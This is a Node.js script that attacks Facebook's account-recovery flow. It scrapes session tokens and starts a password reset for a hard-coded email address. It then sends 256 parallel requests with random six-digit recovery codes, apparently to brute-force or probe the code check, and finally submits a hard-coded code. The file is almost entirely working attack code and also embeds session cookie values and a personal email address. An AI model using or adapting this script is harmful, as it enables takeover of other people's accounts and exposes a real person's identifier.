'use strict';

const log = console.log.bind(console);
const Http2Client = require('./http2-client');
const helpers = require('./helpers');
const child_process = require('node:child_process');
const fs = require('node:fs');

const { rand, randomString, parseHeaders } = helpers;

const httpClient = new Http2Client(true);

const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';

(async () => {
  let baseUrl;

  function getTokens() {
    return new Promise(r => {
      const headers = {
        host: baseUrl.replace('https://', ''),
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Ch-Ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'fr',
        Priority: 'u=0, i'
      };
      httpClient.get(baseUrl+'/?_rdc=1&_rdr', headers).then(res => {
        const { statusCode, headers } = res;
        if (200 !== statusCode) {
          throw new Error('getDatr: http('+statusCode+')');
        }
        const cookies = headers['set-cookie'];
        let match = new RegExp(/<input type="hidden" name="lsd" value="([a-zA-Z0-9-_]+)"/).exec(res.data);

        const tokens = { jazoest: rand(1111, 9999), lsd: match[1] };

        for (let i = 0, cookie, match; cookies.length > i; ++i) {
          cookie = cookies[i];
          match = new RegExp(/datr=([a-zA-Z0-9-_]+)/).exec(cookie);
          if (match) {
            tokens.datr = match[1];
            r(tokens);
            break;
          }
        }

      });
    });
  }

  function getCuid(opts) {
    return new Promise(r => {
      const { email, jazoest, lsd, datr } = opts;
      const url = baseUrl+'/ajax/login/help/identify.php?ctx=recover';
      const cookie = 'datr='+datr+'; sb=1aIxaAGTsAjoyKxzsVeUgiA7; ps_l=1; ps_n=1; fr=0U7dhjX6ZOPUjnbyh..BoMaLV..AAA.0.0.BoMaQc.AWezHTAuGRDws34J8jIrlbAvZRQ; wd=2133x1028; dpr=0.8999999761581421';
      const headers = {
        Cookie: cookie,
        'X-Asbd-Id': '359341',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'X-Fb-Lsd': lsd,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'Sec-Ch-Ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Sec-Ch-Ua-Mobile': '?0',
        Accept: '*/*',
        Origin: baseUrl,
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        Referer: baseUrl+'/login/identify/?ctx=recover&from_login_screen=0',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'fr',
        Priority: 'u=1, i'
      };
      const body = 'jazoest='+jazoest+'&lsd='+lsd+'&email='+encodeURIComponent(email)+'&did_submit=1&__user=0&__a=1&__req=5&__hs=20232.BP%3ADEFAULT.2.0...0&dpr=1&__ccg=GOOD&__rev=1023167992&__s=066oek%3Ad7lhoe%3Aggnoc8&__hsi=7507962560013802118&__dyn=7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa0CEbo1nEhwem0nCq1ewcG0RU2Cw8G1Qw5Mx62G3i0ha2l0Fwqo31w9O0H8jwae4Ueo2swkE5G0zEnwhE2Lw6OyES0gq0Lo6-1Fw4mwr81IWwIwtU5K0UE62&__hsdp=gTNAp3wKxkswUUhaoPDgWqiilwgFt288HF93EhQ0WUa-h4o0JK&__hblp=0Wwa60xU1i81kE1vo881fU0Le09jweq2y06M80HmnUjw5sw0DRjCw2so0VK480jSw2rA0RU0wG&__spin_r=1023167992&__spin_b=trunk&__spin_t=1748083755';
      httpClient.post(url, headers, body).then(res => {
        const { statusCode, headers } = res;
        if (200 !== statusCode) {
          throw new Error('getCuid: http('+statusCode+')');
        }
        const cookies = headers['set-cookie'];
        for (let i = 0, cookie, match; cookies.length > i; ++i) {
          cookie = cookies[i];
          match = new RegExp(/sfiu=([a-zA-Z0-9-_]+)/).exec(cookie);
          if (match) {
            const url = baseUrl+'/ajax/recover/initiate/?lara=1';
            const cookie = 'datr='+datr+'; sb=1aIxaAGTsAjoyKxzsVeUgiA7; ps_l=1; ps_n=1; wd=2133x1028; dpr=0.8999999761581421; fr=0U7dhjX6ZOPUjnbyh..BoMaLV..AAA.0.0.BoMaiI.AWdYypBQIDge0JsFVToETS-SKCI; sfiu='+match[1];
            const headers = {
              Cookie: cookie,
              'X-Asbd-Id': '359341',
              'Sec-Ch-Ua-Platform': '"Linux"',
              'X-Fb-Lsd': lsd,
              'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
              'Sec-Ch-Ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
              'Content-Type': 'application/x-www-form-urlencoded',
              'Sec-Ch-Ua-Mobile': '?0',
              Accept: '*/*',
              Origin: baseUrl,
              'Sec-Fetch-Site': 'same-origin',
              'Sec-Fetch-Mode': 'cors',
              'Sec-Fetch-Dest': 'empty',
              Referer: baseUrl+'/recover/initiate/?is_from_lara_screen=1',
              'Accept-Encoding': 'gzip, deflate',
              'Accept-Language': 'fr',
              Priority: 'u=1, i'
            };
            const body = 'jazoest='+jazoest+'&lsd='+lsd+'&openid_provider_id=1010459756371&openid_provider_name=Google&recover_method=send_email&reset_action=1&__aaid=0&__user=0&__a=1&__req=a&__hs=20232.BP%3ADEFAULT.2.0...0&dpr=1&__ccg=GOOD&__rev=1023167992&__s=4d11wu%3Ad7lhoe%3Aa49k0a&__hsi=7507967516774481520&__dyn=7xeXxa1iJ1q1syawKBAg5S3G2O5U4e1Fx-ewSwMxW4E2czoboG0IE6u3y4o2GwWw5VCwjE3awdu321Rw8G11wBz81s8hwGwQw4iwBgao6C0Mo2swaOfK0zEkxe3C0D85a14xm1Wxe5U4q3y1Sx-0ma2-azqw42g2cwMwrU6C1pg2Xwr86C1nwh87KufxyEbbwqEy2-2K0UE620XEG22&__hsdp=gTNAp6NMKxkswUUhaoThAep54H849ia6ECnum6qXKinyp9kkC9Da2Em0Dy6BEMjV4hBwMAeq6S4Gzy6xil2oB5ecK2jqvzaGfQ9mw8s7kA4oTwpBg6W1cw3X8&__hblp=0Wwa62-1nw58w5iw5Zwww4_w2YU0Be0VEa80r0w7kAwdKnUjw8u1Xwm88E3ywZwe64o4m0Oomw62wrXw8G11xy485K1PGbxW3K3S321IxeU3OwNxOp6wCleWwPwQwp82bAhUmwgohx62u5okwByAu4Eb9oy0E86y8w7_wPBByEf84q0GoO2G5o3ayE-0H8eE1k89Vobotym223y0mW1Xgnwa248Sexm2K1DwmEmwkA1NxC&__spin_r=1023167992&__spin_b=trunk&__spin_t=1748084909';
            return httpClient.post(url, headers, body).then(res => {
              const { statusCode, data } = res;
              if (200 !== statusCode) {
                throw new Error('getCuid: failed to obtain cuid http('+statusCode+')');
              }
              const match = new RegExp(/cuid=([a-zA-Z0-9-_]+)/).exec(data);
              if (!match) {
                log(data);
                throw new Error('getCuid: failed to match cuid');
              }
              r(match[1]);
            });
          }
        }
        throw new Error('getCuid: failed to obtain sfiu');
      });
    });
  }
  

  baseUrl = 'https://www.facebook.com';
  const { jazoest, lsd, datr } = await getTokens();
  log('tokens ok');
  const cuid = await getCuid({ email: 'rokyoplus@gmail.com', jazoest, lsd, datr });
  const realCode = '961193';
  log('cuid ok');

  const url = baseUrl+'/recover/code/?cuid='+cuid;
  const headers = {
    'Cookie': 'datr='+datr,
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': USER_AGENT,
    'Sec-Fetch-Site': 'same-origin'
  };

  const p = [];
  for (let i = 0, code; 256 > i; ++i) {
    code = rand(111111, 999999);
    p.push(new Promise(r => httpClient.post(url, headers, 'lsd='+lsd+'&n='+code).then(res => (log(res.statusCode), r()))));
  }

  Promise.all(p).then(() => {
    log('end');
    httpClient.post(url, headers, 'jazoest='+jazoest+'&lsd='+lsd+'&n='+realCode+'&reset_action=1').then(res => log(res.statusCode));
  });
})();